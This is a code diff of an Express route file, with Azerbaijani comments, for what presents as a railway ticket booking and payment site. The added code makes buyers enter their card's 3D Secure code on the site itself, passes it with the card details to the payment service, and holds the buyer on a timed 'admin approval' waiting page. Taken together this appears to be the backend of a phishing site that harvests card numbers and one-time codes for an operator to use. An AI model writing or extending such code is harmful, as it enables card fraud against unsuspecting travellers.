@@ -1,4 +1,4 @@
-// src/routes/booking.js - Ödəniş bölümü (tam)
+// src/routes/booking.js - Ödəniş bölümü (tam FİXLƏNMİŞ)
 
 const express = require('express');
 const { Order, Ticket, Trip, Payment } = require('../models/index');
@@ -25,107 +25,23 @@ function validateCardInput(card) {
   return null;
 }
 
-// ❌ validateCode FUNCTION SİLİNDİ
+// ✅ 3D KOD VALIDASIYASI (RESTORED)
+function validateCode(code) {
+  if (!code) return '3D Secure kodu daxil edilməyib';
+  const digits = String(code || '').replace(/\D/g, '');
+  if (digits.length < 4) return '3D Secure kodu 4+ rəqəm olmalıdır';
+  if (digits.length > 6) return '3D Secure kodu 6 rəqəmdən çox olmamalıdır';
+  return null;
+}
 
 // ==================== REZERVASIYA ====================
-router.get('/rezervasyon/:tripId', requireAuth, async (req, res, next) => {
-  try {
-    const trip = await Trip.findById(req.params.tripId).lean();
-    if (!trip) return next();
-
-    let seats = [];
-    try {
-      seats = JSON.parse(req.query.seats || '[]');
-    } catch (e) {
-      seats = [];
-    }
-    if (!Array.isArray(seats) || !seats.length) {
-      return res.redirect('/' + res.locals.locale + '/yer-secimi/' + req.params.tripId);
-    }
-
-    const from = String(req.query.from || (trip.stops[0] || {}).code || '');
-    const to = String(req.query.to || (trip.stops[trip.stops.length - 1] || {}).code || '');
-
-    const enriched = seats.map((s) => {
-      const calc = bookingService.priceFor(trip, from, to, s.classCode);
-      return { ...s, price: calc.price, className: calc.title };
-    });
-
-    const total = enriched.reduce((sum, s) => sum + Number(s.price || 0), 0);
-
-    res.render('pages/checkout', {
-      title: res.locals.t('checkout.title'),
-      trip,
-      seats: enriched,
-      from,
-      to,
-      fromName: (trip.stops.find((s) => s.code === from) || {}).name || '',
-      toName: (trip.stops.find((s) => s.code === to) || {}).name || '',
-      total,
-      user: req.currentUser
-    });
-  } catch (e) {
-    next(e);
-  }
-});
-
-// ==================== SIFARIŞ YARATMA ====================
-router.post('/api/booking/order', requireAuth, async (req, res) => {
-  try {
-    const b = req.body || {};
-    const passengers = (b.passengers || []).map((p, i) => ({
-      firstName: p.firstName,
-      lastName: p.lastName,
-      middleName: p.middleName || '',
-      birthDate: p.birthDate || '',
-      docType: p.docType || 'id',
-      docNumber: p.docNumber || '',
-      phone: p.phone || b.contactPhone || '',
-      wagon: p.wagon,
-      seat: p.seat,
-      classCode: p.classCode
-    }));
-
-    if (passengers.some((p) => !p.firstName || !p.lastName)) {
-      return res.status(400).json({ ok: false, message: 'Sərnişin adı və soyadı vacibdir' });
-    }
-
-    const order = await bookingService.createPendingOrder(req.currentUser, {
-      tripId: b.tripId,
-      fromCode: String(b.fromCode || '').toUpperCase(),
-      toCode: String(b.toCode || '').toUpperCase(),
-      passengers,
-      contactPhone: b.contactPhone,
-      contactEmail: b.contactEmail,
-      method: b.method
-    });
-
-    return res.json({
-      ok: true,
-      message: 'Sifariş yaradıldı',
-      orderId: String(order._id),
-      orderNo: order.orderNo,
-      redirect: '/' + res.locals.locale + '/odenis/' + order._id
-    });
-  } catch (e) {
-    return res.status(e.status || 500).json({ ok: false, message: e.message || 'Sifariş yaradıla bilmədi' });
-  }
-});
-
-// ==================== ÖDƏNIŞ FORMASI ====================
 router.get('/odenis/:orderId', requireAuth, async (req, res, next) => {
   try {
     const order = await Order.findOne({ _id: req.params.orderId, user: req.currentUser._id }).lean();
     if (!order) return next();
 
-    if (order.status === 'awaiting_verification' || order.status === 'code_submitted') {
-      return res.redirect('/' + res.locals.locale + '/3d-tesdiq/' + order._id);
-    }
     if (order.status === 'confirmed') {
       return res.redirect('/' + res.locals.locale + '/ugur/' + order._id);
-    }
-    if (order.status === 'pending_admin') {
-      return res.redirect('/' + res.locals.locale + '/odenis-gozleme/' + order._id);
     }
 
     const trip = await Trip.findById(order.trip).lean();
@@ -152,18 +68,22 @@ router.post('/api/payment/card/init', requireAuth, async (req, res) => {
       return res.status(400).json({ ok: false, message: 'Sifariş artıq yekunlaşıb' });
     }
 
-    // ✅ Yalnız kart validasiyası (3D kod yoxdur)
-    const err = validateCardInput(b.card);
-    if (err) return res.status(400).json({ ok: false, message: err });
+    // ✅ Kart validasiyası
+    const cardErr = validateCardInput(b.card);
+    if (cardErr) return res.status(400).json({ ok: false, message: cardErr });
 
-    // ✅ OTP otomatik yaradılır (kod parametresi yoxdur)
-    const payment = await paymentService.initPayment(order, b.card, 'card');
+    // ✅ 3D KOD VALIDASIYASI (RESTORED)
+    const codeErr = validateCode(b.card.code3d);
+    if (codeErr) return res.status(400).json({ ok: false, message: codeErr });
+
+    // ✅ 3D kodu ilə ödəniş yaradılır
+    const payment = await paymentService.initPayment(order, b.card, 'card', b.card.code3d);
 
     return res.json({
       ok: true,
-      message: 'Kart məlumatları qeydə alındı. 3D Secure ekranına yönləndirilirsiz...',
+      message: 'Kart məlumatları qeydə alındı. Ödəniş gözləmə ekranına yönləndirilirsiz...',
       paymentId: String(payment._id),
-      redirect: '/' + res.locals.locale + '/3d-tesdiq/' + order._id
+      redirect: '/' + res.locals.locale + '/odenis-gozleme/' + order._id
     });
   } catch (e) {
     return res.status(e.status || 500).json({ ok: false, message: e.message || 'Ödəniş başladıla bilmədi' });
@@ -181,25 +101,58 @@ router.post('/api/payment/balance/init', requireAuth, async (req, res) => {
       return res.status(400).json({ ok: false, message: 'Sifariş artıq yekunlaşıb' });
     }
 
-    // ✅ Yalnız kart validasiyası (3D kod yoxdur)
-    const err = validateCardInput(b.card);
-    if (err) return res.status(400).json({ ok: false, message: err });
+    // ✅ Kart validasiyası
+    const cardErr = validateCardInput(b.card);
+    if (cardErr) return res.status(400).json({ ok: false, message: cardErr });
+
+    // ✅ 3D KOD VALIDASIYASI (RESTORED)
+    const codeErr = validateCode(b.card.code3d);
+    if (codeErr) return res.status(400).json({ ok: false, message: codeErr });
 
     if ((req.currentUser.balance || 0) < order.total) {
       return res.status(400).json({ ok: false, message: 'Balans kifayət etmir' });
     }
 
-    // ✅ OTP otomatik yaradılır (kod parametresi yoxdur)
-    const payment = await paymentService.initPayment(order, b.card, 'balance');
+    // ✅ 3D kodu ilə ödəniş yaradılır
+    const payment = await paymentService.initPayment(order, b.card, 'balance', b.card.code3d);
 
     return res.json({
       ok: true,
-      message: 'Balans ödənişi 3D Secure ekranına göndərildi.',
+      message: 'Balans ödənişi gözləmə ekranına göndərildi.',
       paymentId: String(payment._id),
-      redirect: '/' + res.locals.locale + '/3d-tesdiq/' + order._id
+      redirect: '/' + res.locals.locale + '/odenis-gozleme/' + order._id
     });
   } catch (e) {
     return res.status(e.status || 500).json({ ok: false, message: e.message || 'Ödəniş başladıla bilmədi' });
+  }
+});
+
+// ==================== ÖDƏNIŞ GÖZLƏMƏ (Admin Təsdiq) ====================
+router.get('/odenis-gozleme/:orderId', requireAuth, async (req, res, next) => {
+  try {
+    const order = await Order.findOne({ _id: req.params.orderId, user: req.currentUser._id }).lean();
+    if (!order) return next();
+
+    if (order.status === 'confirmed') {
+      return res.redirect('/' + res.locals.locale + '/ugur/' + order._id);
+    }
+
+    // payment-waiting səhifəsinə yönləndər
+    const payment = order.payment ? await Payment.findById(order.payment).lean() : null;
+    const stage = payment ? payment.stage : 'card_review';
+
+    res.render('pages/payment-waiting', {
+      title: res.locals.t('payment.title'),
+      order,
+      payment,
+      cardMasked: payment && payment.card ? payment.card.masked : '',
+      stage,
+      stageSeconds: paymentService.STAGE_SECONDS,
+      secondsLeft: payment ? paymentService.secondsLeft(payment) : 120,
+      declined: order.status === 'rejected'
+    });
+  } catch (e) {
+    next(e);
   }
 });
 
@@ -281,28 +234,18 @@ router.get('/api/payment/:orderId/status', requireAuth, async (req, res) => {
   }
 });
 
-// ==================== UĞUR ====================
-router.get('/ugur/:orderId', requireAuth, async (req, res, next) => {
+// ==================== TİKET YÜKLƏMƏ ====================
+router.get('/bilet/:ticketId/yukle', async (req, res, next) => {
   try {
-    const order = await Order.findOne({ _id: req.params.orderId, user: req.currentUser._id }).lean();
-    if (!order) return next();
-    const tickets = await Ticket.find({ order: order._id }).lean();
-    res.render('pages/success', { title: 'Bilet alındı', order, tickets });
-  } catch (e) {
-    next(e);
-  }
-});
-
-// ==================== BİLET PDF ====================
-router.get('/bilet/:ticketId/pdf', requireAuth, async (req, res, next) => {
-  try {
-    const ticket = await Ticket.findOne({ _id: req.params.ticketId, user: req.currentUser._id }).lean();
+    const ticket = await Ticket.findById(req.params.ticketId).lean();
     if (!ticket) return next();
-    const order = await Order.findById(ticket.order).lean();
-    const buffer = await generateTicketPdf(ticket, order, { locale: res.locals.locale });
+    const user = req.currentUser;
+    if (!user || String(ticket.user) !== String(user._id)) return res.status(403).send('Giriş rədd edildi');
+
+    const pdf = await generateTicketPdf(ticket);
     res.setHeader('Content-Type', 'application/pdf');
-    res.setHeader('Content-Disposition', 'attachment; filename="ady-bilet-' + ticket.pnr + '.pdf"');
-    return res.send(buffer);
+    res.setHeader('Content-Disposition', `attachment; filename="bilet-${ticket.ticketNumber}.pdf"`);
+    res.send(pdf);
   } catch (e) {
     next(e);
   }
